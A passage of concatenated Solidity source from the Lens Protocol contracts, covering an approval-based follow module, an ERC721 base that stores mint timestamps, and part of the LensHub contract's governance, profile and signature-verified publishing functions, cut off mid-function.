a follow by:\n     *  1. Validating that the follower has been approved for that profile by the profile owner\n     */\n    function processFollow(\n        address follower,\n        uint256 profileId,\n        bytes calldata data\n    ) external override onlyHub {\n        address owner = IERC721(HUB).ownerOf(profileId);\n        if (!_approvedByProfileByOwner[owner][profileId][follower])\n            revert Errors.FollowNotApproved();\n        _approvedByProfileByOwner[owner][profileId][follower] = false; // prevents repeat follows\n    }\n\n    /**\n     * @dev We don't need to execute any additional logic on transfers in this follow module.\n     */\n    function followModuleTransferHook(\n        uint256 profileId,\n        address from,\n        address to,\n        uint256 followNFTTokenId\n    ) external override {}\n\n    /**\n     * @notice Returns whether the given address is approved for the profile owned by a given address.\n     *\n     * @param profileOwner The profile owner of the profile to query the approval with.\n     * @param profileId The token ID of the profile to query approval with.\n     * @param toCheck The address to query approval for.\n     *\n     * @return\n     */\n    function isApproved(\n        address profileOwner,\n        uint256 profileId,\n        address toCheck\n    ) external view returns (bool) {\n        return _approvedByProfileByOwner[profileOwner][profileId][toCheck];\n    }\n\n    /**\n     * @notice Returns whether the given addresses are approved for the profile owned by a given address.\n     *\n     * @param profileOwner The profile owner of the profile to query the approvals with.\n     * @param profileId The token ID of the profile to query approvals with.\n     * @param toCheck The address array to query approvals for.\n     */\n    function isApprovedArray(\n        address profileOwner,\n        uint256 profileId,\n        address[] calldata toCheck\n    ) external view returns (bool[] memory) {\n        bool[] memory approved = new bool[](toCheck.length);\n        for (uint256 i = 0; i < toCheck.length; ++i) {\n            approved[i] = _approvedByProfileByOwner[profileOwner][profileId][toCheck[i]];\n        }\n        return approved;\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport '@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol';\nimport '@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol';\nimport '@openzeppelin/contracts/utils/Address.sol';\nimport '@openzeppelin/contracts/utils/Context.sol';\nimport '@openzeppelin/contracts/utils/Strings.sol';\nimport '@openzeppelin/contracts/utils/introspection/ERC165.sol';\nimport './IERC721Time.sol';\n\n/**\n * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including\n * the Metadata extension, but not including the Enumerable extension, which is available separately as\n * {ERC721Enumerable}.\n *\n * Modifications:\n * 1. Refactored _operatorApprovals setter into an internal function to allow meta-transactions.\n * 2. Constructor replaced with an initializer.\n * 3. Mint timestamp is now stored in a TokenData struct alongside the owner address.\n */\nabstract contract ERC721Time is Context, ERC165, IERC721Time, IERC721Metadata {\n    using Address for address;\n    using Strings for uint256;\n\n    // Token name\n    string private _name;\n\n    // Token symbol\n    string private _symbol;\n\n    // Mapping from token ID to token Data (owner address and mint timestamp uint96), this\n    // replaces the original mapping(uint256 => address) private _owners;\n    mapping(uint256 => IERC721Time.TokenData) private _tokenData;\n\n    // Mapping owner address to token count\n    mapping(address => uint256) private _balances;\n\n    // Mapping from token ID to approved address\n    mapping(uint256 => address) private _tokenApprovals;\n\n    // Mapping from owner to operator approvals\n    mapping(address => mapping(address => bool)) private _operatorApprovals;\n\n    /**\n     * @dev Initializes the ERC721 name and symbol.\n     *\n     * @param name The name to set.\n     * @param symbol The symbol to set.\n     */\n    function __ERC721_Init(string calldata name, string calldata symbol) internal {\n        _name = name;\n        _symbol = symbol;\n    }\n\n    /**\n     * @dev See {IERC165-supportsInterface}.\n     */\n    function supportsInterface(bytes4 interfaceId)\n        public\n        view\n        virtual\n        override(ERC165, IERC165)\n        returns (bool)\n    {\n        return\n            interfaceId == type(IERC721).interfaceId ||\n            interfaceId == type(IERC721Metadata).interfaceId ||\n            super.supportsInterface(interfaceId);\n    }\n\n    /**\n     * @dev See {IERC721-balanceOf}.\n     */\n    function balanceOf(address owner) public view virtual override returns (uint256) {\n        require(owner != address(0), 'ERC721: balance query for the zero address');\n        return _balances[owner];\n    }\n\n    /**\n     * @dev See {IERC721-ownerOf}.\n     */\n    function ownerOf(uint256 tokenId) public view virtual override returns (address) {\n        address owner = _tokenData[tokenId].owner;\n        require(owner != address(0), 'ERC721: owner query for nonexistent token');\n        return owner;\n    }\n\n    /**\n     * @dev See {IERC721Time-mintTimestampOf}\n     */\n    function mintTimestampOf(uint256 tokenId) public view virtual override returns (uint256) {\n        uint96 mintTimestamp = _tokenData[tokenId].mintTimestamp;\n        require(mintTimestamp != 0, 'ERC721: mint timestamp query for nonexistent token');\n        return mintTimestamp;\n    }\n\n    /**\n     * @dev See {IERC721Time-mintTimestampOf}\n     */\n    function tokenDataOf(uint256 tokenId)\n        public\n        view\n        virtual\n        override\n        returns (IERC721Time.TokenData memory)\n    {\n        require(_exists(tokenId), 'ERC721: token data query for nonexistent token');\n        return _tokenData[tokenId];\n    }\n\n    /**\n     * @dev See {IERC721Metadata-name}.\n     */\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev See {IERC721Metadata-symbol}.\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev See {IERC721Metadata-tokenURI}.\n     */\n    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\n        require(_exists(tokenId), 'ERC721Metadata: URI query for nonexistent token');\n\n        string memory baseURI = _baseURI();\n        return\n            bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';\n    }\n\n    /**\n     * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each\n     * token will be the concatenation of the `baseURI` and the `tokenId`. Empty\n     * by default, can be overriden in child contracts.\n     */\n    function _baseURI() internal view virtual returns (string memory) {\n        return '';\n    }\n\n    /**\n     * @dev See {IERC721-approve}.\n     */\n    function approve(address to, uint256 tokenId) public virtual override {\n        address owner = ERC721Time.ownerOf(tokenId);\n        require(to != owner, 'ERC721: approval to current owner');\n\n        require(\n            _msgSender() == owner || isApprovedForAll(owner, _msgSender()),\n            'ERC721: approve caller is not owner nor approved for all'\n        );\n\n        _approve(to, tokenId);\n    }\n\n    /**\n     * @dev See {IERC721-getApproved}.\n     */\n    function getApproved(uint256 tokenId) public view virtual override returns (address) {\n        require(_exists(tokenId), 'ERC721: approved query for nonexistent token');\n\n        return _tokenApprovals[tokenId];\n    }\n\n    /**\n     * @dev See {IERC721-setApprovalForAll}.\n     */\n    function setApprovalForAll(address operator, bool approved) public virtual override {\n        require(operator != _msgSender(), 'ERC721: approve to caller');\n\n        _setOperatorApproval(_msgSender(), operator, approved);\n    }\n\n    /**\n     * @dev See {IERC721-isApprovedForAll}.\n     */\n    function isApprovedForAll(address owner, address operator)\n        public\n        view\n        virtual\n        override\n        returns (bool)\n    {\n        return _operatorApprovals[owner][operator];\n    }\n\n    /**\n     * @dev See {IERC721-transferFrom}.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public virtual override {\n        //solhint-disable-next-line max-line-length\n        require(\n            _isApprovedOrOwner(_msgSender(), tokenId),\n            'ERC721: transfer caller is not owner nor approved'\n        );\n\n        _transfer(from, to, tokenId);\n    }\n\n    /**\n     * @dev See {IERC721-safeTransferFrom}.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public virtual override {\n        safeTransferFrom(from, to, tokenId, '');\n    }\n\n    /**\n     * @dev See {IERC721-safeTransferFrom}.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory _data\n    ) public virtual override {\n        require(\n            _isApprovedOrOwner(_msgSender(), tokenId),\n            'ERC721: transfer caller is not owner nor approved'\n        );\n        _safeTransfer(from, to, tokenId, _data);\n    }\n\n    /**\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\n     *\n     * `_data` is additional data, it has no specified format and it is sent in call to `to`.\n     *\n     * This internal function is equivalent to {safeTransferFrom}, and can be used to e.g.\n     * implement alternative mechanisms to perform token transfer, such as signature-based.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must exist and be owned by `from`.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _safeTransfer(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory _data\n    ) internal virtual {\n        _transfer(from, to, tokenId);\n        require(\n            _checkOnERC721Received(from, to, tokenId, _data),\n            'ERC721: transfer to non ERC721Receiver implementer'\n        );\n    }\n\n    /**\n     * @dev Returns whether `tokenId` exists.\n     *\n     * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.\n     *\n     * Tokens start existing when they are minted (`_mint`),\n     * and stop existing when they are burned (`_burn`).\n     */\n    function _exists(uint256 tokenId) internal view virtual returns (bool) {\n        return _tokenData[tokenId].owner != address(0);\n    }\n\n    /**\n     * @dev Returns whether `spender` is allowed to manage `tokenId`.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     */\n    function _isApprovedOrOwner(address spender, uint256 tokenId)\n        internal\n        view\n        virtual\n        returns (bool)\n    {\n        require(_exists(tokenId), 'ERC721: operator query for nonexistent token');\n        address owner = ERC721Time.ownerOf(tokenId);\n        return (spender == owner ||\n            getApproved(tokenId) == spender ||\n            isApprovedForAll(owner, spender));\n    }\n\n    /**\n     * @dev Safely mints `tokenId` and transfers it to `to`.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must not exist.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _safeMint(address to, uint256 tokenId) internal virtual {\n        _safeMint(to, tokenId, '');\n    }\n\n    /**\n     * @dev Same as {xref-ERC721-_safeMint-address-uint256-}[`_safeMint`], with an additional `data` parameter which is\n     * forwarded in {IERC721Receiver-onERC721Received} to contract recipients.\n     */\n    function _safeMint(\n        address to,\n        uint256 tokenId,\n        bytes memory _data\n    ) internal virtual {\n        _mint(to, tokenId);\n        require(\n            _checkOnERC721Received(address(0), to, tokenId, _data),\n            'ERC721: transfer to non ERC721Receiver implementer'\n        );\n    }\n\n    /**\n     * @dev Mints `tokenId` and transfers it to `to`.\n     *\n     * WARNING: Usage of this method is discouraged, use {_safeMint} whenever possible\n     *\n     * Requirements:\n     *\n     * - `tokenId` must not exist.\n     * - `to` cannot be the zero address.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _mint(address to, uint256 tokenId) internal virtual {\n        require(to != address(0), 'ERC721: mint to the zero address');\n        require(!_exists(tokenId), 'ERC721: token already minted');\n\n        _beforeTokenTransfer(address(0), to, tokenId);\n\n        _balances[to] += 1;\n        _tokenData[tokenId].owner = to;\n        _tokenData[tokenId].mintTimestamp = uint96(block.timestamp);\n\n        emit Transfer(address(0), to, tokenId);\n    }\n\n    /**\n     * @dev Destroys `tokenId`.\n     * The approval is cleared when the token is burned.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _burn(uint256 tokenId) internal virtual {\n        address owner = ERC721Time.ownerOf(tokenId);\n\n        _beforeTokenTransfer(owner, address(0), tokenId);\n\n        // Clear approvals\n        _approve(address(0), tokenId);\n\n        _balances[owner] -= 1;\n        delete _tokenData[tokenId];\n\n        emit Transfer(owner, address(0), tokenId);\n    }\n\n    /**\n     * @dev Transfers `tokenId` from `from` to `to`.\n     *  As opposed to {transferFrom}, this imposes no restrictions on msg.sender.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must be owned by `from`.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _transfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal virtual {\n        require(ERC721Time.ownerOf(tokenId) == from, 'ERC721: transfer of token that is not own');\n        require(to != address(0), 'ERC721: transfer to the zero address');\n\n        _beforeTokenTransfer(from, to, tokenId);\n\n        // Clear approvals from the previous owner\n        _approve(address(0), tokenId);\n\n        _balances[from] -= 1;\n        _balances[to] += 1;\n        _tokenData[tokenId].owner = to;\n\n        emit Transfer(from, to, tokenId);\n    }\n\n    /**\n     * @dev Approve `to` to operate on `tokenId`\n     *\n     * Emits a {Approval} event.\n     */\n    function _approve(address to, uint256 tokenId) internal virtual {\n        _tokenApprovals[tokenId] = to;\n        emit Approval(ERC721Time.ownerOf(tokenId), to, tokenId);\n    }\n\n    /**\n     * @dev Refactored from the original OZ ERC721 implementation: approve or revoke approval from\n     * `operator` to operate on all tokens owned by `owner`.\n     *\n     * Emits a {ApprovalForAll} event.\n     */\n    function _setOperatorApproval(\n        address owner,\n        address operator,\n        bool approved\n    ) internal virtual {\n        _operatorApprovals[owner][operator] = approved;\n        emit ApprovalForAll(owner, operator, approved);\n    }\n\n    /**\n     * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.\n     * The call is not executed if the target address is not a contract.\n     *\n     * @param from address representing the previous owner of the given token ID\n     * @param to target address that will receive the tokens\n     * @param tokenId uint256 ID of the token to be transferred\n     * @param _data bytes optional data to send along with the call\n     * @return bool whether the call correctly returned the expected magic value\n     */\n    function _checkOnERC721Received(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory _data\n    ) private returns (bool) {\n        if (to.isContract()) {\n            try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (\n                bytes4 retval\n            ) {\n                return retval == IERC721Receiver.onERC721Received.selector;\n            } catch (bytes memory reason) {\n                if (reason.length == 0) {\n                    revert('ERC721: transfer to non ERC721Receiver implementer');\n                } else {\n                    assembly {\n                        revert(add(32, reason), mload(reason))\n                    }\n                }\n            }\n        } else {\n            return true;\n        }\n    }\n\n    /**\n     * @dev Hook that is called before any token transfer. This includes minting\n     * and burning.\n     *\n     * Calling conditions:\n     *\n     * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be\n     * transferred to `to`.\n     * - When `from` is zero, `tokenId` will be minted for `to`.\n     * - When `to` is zero, ``from``'s `tokenId` will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal virtual {}\n}\n\n\n// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {ILensHub} from '../interfaces/ILensHub.sol';\nimport {Events} from '../libraries/Events.sol';\nimport {Helpers} from '../libraries/Helpers.sol';\nimport {DataTypes} from '../libraries/DataTypes.sol';\nimport {Errors} from '../libraries/Errors.sol';\nimport {PublishingLogic} from '../libraries/PublishingLogic.sol';\nimport {InteractionLogic} from '../libraries/InteractionLogic.sol';\nimport {LensNFTBase} from './base/LensNFTBase.sol';\nimport {LensMultiState} from './base/LensMultiState.sol';\nimport {LensHubStorage} from './storage/LensHubStorage.sol';\nimport {VersionedInitializable} from '../upgradeability/VersionedInitializable.sol';\n\n/**\n * @title LensHub\n * @author Lens Protocol\n *\n * @notice This is the main entrypoint of the Lens Protocol. It contains governance functionality as well as\n * publishing and profile interaction functionality.\n *\n * NOTE: The Lens Protocol is unique in that frontend operators need to track a potentially overwhelming\n * number of NFT contracts and interactions at once. For that reason, we've made two quirky design decisions:\n *      1. Both Follow & Collect NFTs invoke an LensHub callback on transfer with the sole purpose of emitting an event.\n *      2. Almost every event in the protocol emits the current block timestamp, reducing the need to fetch it manually.\n */\ncontract LensHub is ILensHub, LensNFTBase, VersionedInitializable, LensMultiState, LensHubStorage {\n    uint256 internal constant REVISION = 1;\n\n    address internal immutable FOLLOW_NFT_IMPL;\n    address internal immutable COLLECT_NFT_IMPL;\n\n    /**\n     * @dev This modifier reverts if the caller is not the configured governance address.\n     */\n    modifier onlyGov() {\n        _validateCallerIsGovernance();\n        _;\n    }\n\n    /**\n     * @dev This modifier reverts if the caller is not a whitelisted profile creator address.\n     */\n    modifier onlyWhitelistedProfileCreator() {\n        _validateCallerIsWhitelistedProfileCreator();\n        _;\n    }\n\n    /**\n     * @dev The constructor sets the immutable follow & collect NFT implementations.\n     *\n     * @param followNFTImpl The follow NFT implementation address.\n     * @param collectNFTImpl The collect NFT implementation address.\n     */\n    constructor(address followNFTImpl, address collectNFTImpl) {\n        FOLLOW_NFT_IMPL = followNFTImpl;\n        COLLECT_NFT_IMPL = collectNFTImpl;\n    }\n\n    /// @inheritdoc ILensHub\n    function initialize(\n        string calldata name,\n        string calldata symbol,\n        address newGovernance\n    ) external override initializer {\n        super._initialize(name, symbol);\n        _setState(DataTypes.ProtocolState.Paused);\n        _setGovernance(newGovernance);\n    }\n\n    /// ***********************\n    /// *****GOV FUNCTIONS*****\n    /// ***********************\n\n    /// @inheritdoc ILensHub\n    function setGovernance(address newGovernance) external override onlyGov {\n        _setGovernance(newGovernance);\n    }\n\n    /// @inheritdoc ILensHub\n    function setEmergencyAdmin(address newEmergencyAdmin) external override onlyGov {\n        address prevEmergencyAdmin = _emergencyAdmin;\n        _emergencyAdmin = newEmergencyAdmin;\n        emit Events.EmergencyAdminSet(\n            msg.sender,\n            prevEmergencyAdmin,\n            newEmergencyAdmin,\n            block.timestamp\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setState(DataTypes.ProtocolState newState) external override {\n        if (msg.sender != _governance && msg.sender != _emergencyAdmin)\n            revert Errors.NotGovernanceOrEmergencyAdmin();\n        _setState(newState);\n    }\n\n    ///@inheritdoc ILensHub\n    function whitelistProfileCreator(address profileCreator, bool whitelist)\n        external\n        override\n        onlyGov\n    {\n        _profileCreatorWhitelisted[profileCreator] = whitelist;\n        emit Events.ProfileCreatorWhitelisted(profileCreator, whitelist, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function whitelistFollowModule(address followModule, bool whitelist) external override onlyGov {\n        _followModuleWhitelisted[followModule] = whitelist;\n        emit Events.FollowModuleWhitelisted(followModule, whitelist, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function whitelistReferenceModule(address referenceModule, bool whitelist)\n        external\n        override\n        onlyGov\n    {\n        _referenceModuleWhitelisted[referenceModule] = whitelist;\n        emit Events.ReferenceModuleWhitelisted(referenceModule, whitelist, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function whitelistCollectModule(address collectModule, bool whitelist)\n        external\n        override\n        onlyGov\n    {\n        _collectModuleWhitelisted[collectModule] = whitelist;\n        emit Events.CollectModuleWhitelisted(collectModule, whitelist, block.timestamp);\n    }\n\n    /// *********************************\n    /// *****PROFILE OWNER FUNCTIONS*****\n    /// *********************************\n\n    /// @inheritdoc ILensHub\n    function createProfile(DataTypes.CreateProfileData calldata vars)\n        external\n        override\n        whenNotPaused\n        onlyWhitelistedProfileCreator\n    {\n        uint256 profileId = ++_profileCounter;\n        _mint(vars.to, profileId);\n        PublishingLogic.createProfile(\n            vars,\n            profileId,\n            _profileIdByHandleHash,\n            _profileById,\n            _followModuleWhitelisted\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowModule(\n        uint256 profileId,\n        address followModule,\n        bytes calldata followModuleData\n    ) external override whenNotPaused {\n        _validateCallerIsProfileOwner(profileId);\n        PublishingLogic.setFollowModule(\n            profileId,\n            followModule,\n            followModuleData,\n            _profileById[profileId],\n            _followModuleWhitelisted\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowModuleWithSig(DataTypes.SetFollowModuleWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_FOLLOW_MODULE_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.followModule,\n                            keccak256(vars.followModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        PublishingLogic.setFollowModule(\n            vars.profileId,\n            vars.followModule,\n            vars.followModuleData,\n            _profileById[vars.profileId],\n            _followModuleWhitelisted\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setDispatcher(uint256 profileId, address dispatcher) external override whenNotPaused {\n        _validateCallerIsProfileOwner(profileId);\n        _setDispatcher(profileId, dispatcher);\n    }\n\n    /// @inheritdoc ILensHub\n    function setDispatcherWithSig(DataTypes.SetDispatcherWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_DISPATCHER_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.dispatcher,\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _setDispatcher(vars.profileId, vars.dispatcher);\n    }\n\n    /// @inheritdoc ILensHub\n    function setProfileImageURI(uint256 profileId, string calldata imageURI)\n        external\n        override\n        whenNotPaused\n    {\n        _validateCallerIsProfileOwnerOrDispatcher(profileId);\n        _setProfileImageURI(profileId, imageURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function setProfileImageURIWithSig(DataTypes.SetProfileImageURIWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_PROFILE_IMAGE_URI_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.imageURI)),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _setProfileImageURI(vars.profileId, vars.imageURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowNFTURI(uint256 profileId, string calldata followNFTURI)\n        external\n        override\n        whenNotPaused\n    {\n        _validateCallerIsProfileOwnerOrDispatcher(profileId);\n        _setFollowNFTURI(profileId, followNFTURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowNFTURIWithSig(DataTypes.SetFollowNFTURIWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_FOLLOW_NFT_URI_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.followNFTURI)),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _setFollowNFTURI(vars.profileId, vars.followNFTURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function post(DataTypes.PostData calldata vars) external override whenPublishingEnabled {\n        _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n        _createPost(\n            vars.profileId,\n            vars.contentURI,\n            vars.collectModule,\n            vars.collectModuleData,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function postWithSig(DataTypes.PostWithSigData calldata vars)\n        external\n        override\n        whenPublishingEnabled\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            POST_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.contentURI)),\n                            vars.collectModule,\n                            keccak256(vars.collectModuleData),\n                            vars.referenceModule,\n                            keccak256(vars.referenceModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _createPost(\n            vars.profileId,\n            vars.contentURI,\n            vars.collectModule,\n            vars.collectModuleData,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function comment(DataTypes.CommentData calldata vars) external override whenPublishingEnabled {\n        _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n        _createComment(vars);\n    }\n\n    /// @inheritdoc ILensHub\n    function commentWithSig(DataTypes.CommentWithSigData calldata vars)\n        external\n        override\n        whenPublishingEnabled\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            COMMENT_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.contentURI)),\n                            vars.profileIdPointed,\n                            vars.pubIdPointed,\n                            vars.collectModule,\n                            keccak256(vars.collectModuleData),\n                            vars.referenceModule,\n                            keccak256(vars.referenceModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _createComment(\n            DataTypes.CommentData(\n                vars.profileId,\n                vars.contentURI,\n                vars.profileIdPointed,\n                vars.pubIdPointed,\n                vars.collectModule,\n                vars.collectModuleData,\n                vars.referenceModule,\n                vars.referenceModuleData\n            )\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function mirror(DataTypes.MirrorData calldata vars) external override whenPublishingEnabled {\n        _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n        _createMirror(\n            vars.profileId,\n            vars.profileIdPointed,\n            vars.pubIdPointed,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function mirrorWithSig(DataTypes.MirrorWithSigData calldata vars)\n        external\n        override\n        whenPublishingEnabled\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            MIRROR_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.profileIdPointed,\n                            vars.pubIdPointed,\n                            vars.referenceModule,\n                            keccak256(vars.referenceModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _createMirror(\n            vars.profileId,\n            vars.profileIdPointed,\n            vars.pubIdPointed,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /**\n     * @notice Burns a profile, this maintains the profile data struct, but deletes the\n     * handle hash to profile ID mapping value.\n     *\n     * NOTE: This overrides the LensNFTBase contract's `burn()` function and calls it to fully burn\n     * the NFT.\n     */\n    function burn(uint256 tokenId) public override whenNotPaused {\n        super.burn(tokenId);\n        _clearHandleHash(tokenId);\n    }\n\n    /**\n     * @notice Burns a profile with a signature, this maintains the profile data struct, but deletes the\n     * handle hash to profile ID mapping value.\n     *\n     * NOTE: This overrides the LensNFTBase contract's `burnWithSig()` function and calls it to fully burn\n     * the NFT.\n     */\n    function burnWithSig(uint256 tokenId, DataTypes.EIP712Signature calldata sig)\n        public\n        override\n        whenNotPaused\n    {\n        super.burnWithSig(tokenId, sig);\n        _clearHandleHash(tokenId);\n    }\n\n    /// ***************************************\n    /// *****PROFILE INTERACTION FUNCTIONS*****\n    /// ***************************************\n\n    /// @inheritdoc ILensHub\n    function follow(uint256[] calldata profileIds, bytes[] calldata datas)\n        external\n        override\n        whenNotPaused\n    {\n        InteractionLogic.follow(\n            msg.sender,\n            profileIds,\n            datas,\n            FOLLOW_NFT_IMPL,\n            _profileById,\n            _profileIdByHandleHash\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function followWithSig(DataTypes.FollowWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        bytes32[] memory dataHashes = new bytes32[](vars.datas.length);\n        for (uint256 i = 0; i < vars.datas.length; ++i) {\n            dataHashes[i] = keccak256(vars.datas[i]);\n        }\n\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            FOLLOW_WITH_SIG_TYPEHASH,\n                            keccak256(abi.encodePacked(vars.profileIds)),\n                            keccak256(abi.encodePacked(dataHashes)),\n                            sigNonces[vars.follower]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, vars.follower, vars.sig);\n        InteractionLogic.follow(\n            vars.follower,\n            vars.profileIds,\n            vars.datas,\n            FOLLOW_NFT_IMPL,\n            _profileById,\n            _profileIdByHandleHash\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function collect(\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) external override whenNotPaused {\n        InteractionLogic.collect(\n            msg.sender,\n            profileId,\n            pubId,\n            data,\n            COLLECT_NFT_IMPL,\n            _pubByIdByProfile,\n            _profileById\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function collectWithSig(DataTypes.CollectWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    